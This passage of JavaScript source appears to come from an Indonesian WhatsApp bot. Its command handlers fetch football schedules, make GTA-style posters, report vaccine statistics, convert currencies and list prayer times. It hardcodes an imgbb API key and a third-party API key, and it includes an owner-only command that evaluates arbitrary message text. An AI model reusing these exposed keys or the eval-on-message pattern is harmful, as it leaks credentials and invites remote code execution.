					for (let i of anu) {
						teks += `*Tanggal:* : ${i.tanggal}\n*Jam* : ${i.jam}\n*Liga* : ${i.liga}\n*Match* : ${i.match}\n*Tv Channel* : ${i.ch_tv}\n\n*JADWAL BOLA*\n`
					}
					reply(teks.trim())  
					
					break
case 'gta':
case 'Gta':
				if (isBanned) return reply(mess.ban)
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(mess.wait)
	  owgi = await syaa.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(7)
	  anu = await imgbb("520bd6f6209077d1777c2a4f20c509c2", owgi)
	  hehe = await getBuffer(`https://zenzapi.xyz/api/photooxy/gtaposter?image=${anu.display_url}&apikey=Katashi`)
	 syaa.sendMessage(from, hehe, image, {quoted:mek})
	} else {
	  reply('Foto Nya Mana Gan ðŸ—¿')
	}
	break
case 'vaksin':
case 'Vaksin':
if (isBanned) return reply(mess.ban)
        if (!isGroup) return reply(mess.only.group);
                    get_result = await fetchJson(`https://vaksincovid19-api.vercel.app/api/vaksin`)
                    reply(mess.wait)
                    ini_txt = `Total Sasaran : ${get_result.totalsasaran}\n`
                    ini_txt += `Sasaran Vaksin Sdmkl : ${get_result.sasaranvaksinsdmk}\n`
                    ini_txt += `Sasaran Vaksin Lansia : ${get_result.sasaranvaksinlansia}\n`
                    ini_txt += `Sasaran Vaksin Petugas Publik : ${get_result.sasaranvaksinpetugaspublik}\n`
                    ini_txt += `Vaksin 1 : \n${get_result.vaksinasi1}\n`
                    ini_txt += `Vaksin 2 : \n${get_result.vaksinasi2}\n`
                    ini_txt += `Last Update : \n${get_result.lastUpdate}`
                    reply(ini_txt)
                    break
case 'Hitungmatauang':
case 'hitungmatauang':
if (isBanned) return reply(mess.ban)
        if (!isGroup) return reply(mess.only.group);
        if (args.length < 1) return reply(`*Example :*\n${prefix}${command} usd|id|12`)
					makell = args.join(" ")
					r1 = makell.split("|")[0];
					r2 = makell.split("|")[1];
					r3 = makell.split("|")[2]
                    get_result = await fetchJson(`https://api-exchange-rates.herokuapp.com/calculator?from=${r1}&to=${r2}&amount=${r3}`)
                    get_result = get_result.data
                    reply(mess.wait)
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Mata Uang 1 : ${get_result.fromResult}\n`
                    ini_txt += `Mata Uang 1 : ${get_result.toResult}\n`
                    ini_txt += `Update Tanggal : ${get_result.updatedAt}`
                    reply(ini_txt)
                    break
case 'listdaerah2': // Update By KATASHI
case 'Listdaerah2': // Update By KATASHI
reply(mess.wait)
					data = await fetchJson(`https://jadwal-shalat-api.herokuapp.com/citiesl`, {method: 'get'})
					teks = 'PESANTREN\n'
					for (var i of data) {
						teks += `*Id:* : ${i.data.cityId}\n*Nama:* ${i.data.cityName}\n\nPESANTREN\n`
					}
					reply(teks.trim())
					
					break
	case 'jadwalsholat': // by Katashi
case 'jadwalsholat': // by Katashi
if (isBanned) return reply(mess.ban)
        if (!isGroup) return reply(mess.only.group);
       reply('Di pilih tanggalnya')
        sendButMessage(from, `Hai Kak ${pushname} `, `Mau Pilih Yang Mana?`, [
          {
            buttonId: `${prefix}oklah`,
            buttonText: {
              displayText: `kok gitu sih:)`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}apaan6`,
            buttonText: {
              displayText: `Dahlah`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}awokkk`,
            buttonText: {
              displayText: `end:/`,
            },
            type: 1,
          },
        ]);
        break;
	
        
      case "eval":
        if (!isOwner && !mek.key.fromMe) return reply(mess.own)
        syaa.sendMessage(
          from,
          JSON.stringify(eval(budy.slice(5)), null, "\t"),
          text,
          { quoted: mek }
        );
        break;
      default:
        }
                  
    if (isGroup && budy != undefined) {
    } else {
      console.log(
        color("[TEXT]", "red"),
        "SELF-MODE",
        color(sender.split("@")[0])
      );
    }
  } catch (e) {
    e = String(e);
    if (!e.includes("c.isZero") && !e.includes("jid")) {
      console.log("Message : %s", color(e, "green"));
    }
    // console.log(e)
  }
};
